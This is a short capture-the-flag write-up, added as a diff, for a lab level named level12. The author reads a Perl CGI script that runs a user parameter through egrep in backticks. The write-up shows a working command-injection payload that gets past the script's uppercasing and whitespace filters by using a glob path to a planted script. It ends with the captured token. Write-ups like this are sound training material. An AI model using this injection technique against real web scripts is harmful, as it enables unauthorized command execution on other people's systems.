@@ -1,0 +1,46 @@
+ll
+|
+L-> -rwsr-sr-x+ 1 flag12 [...] level12.pl*
+
+ok now you know the exploit with s byte
+
+cat level12.pl
+|
+L-> # localhost:4646
+L-> [...]
+L-> $xx =~ tr/a-z/A-Z/;
+L-> $xx =~ s/\s.*//;
+L-> @output = `egrep "^$xx" /tmp/xd 2>&1`;
+L-> [...]
+L-> n(t(param("x"), param("y")));
+
+so we see that we can curl on localhost:4646/level12.pl with x and y params
+the y params is useless as we can see in the script
+otherwise we see @output which is using a shell command usigng regex
+the first regex will capitilize every char of the x params 
+the second remove every whitespace so we can't just do a x="/bin/getflag > /tmp/token"
+because it will turn it into "/BIN/GETFLAG>/TMP/TOKEN"
+
+so we need to create a script with a capitilize name which make it for us
+
+echo "/bin/getflag > /tmp/token" > /tmp/SCRIPT
+
+chmod +x /tmp/SCRIPT
+
+but another problem, /tmp will be turned into /TMP so we need to use * in our request
+
+like this we will have something like x='`/*/SCRIPT`'
+
+the program will launch ou script and we will be able to get the flag let try
+
+curl 127.0.0.1:4646/level12.pl?x='`/*/SCRIPT`'
+|
+L-> ..
+
+ok lets try to cat it
+
+cat /tmp/token
+|
+L-> Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+here we go
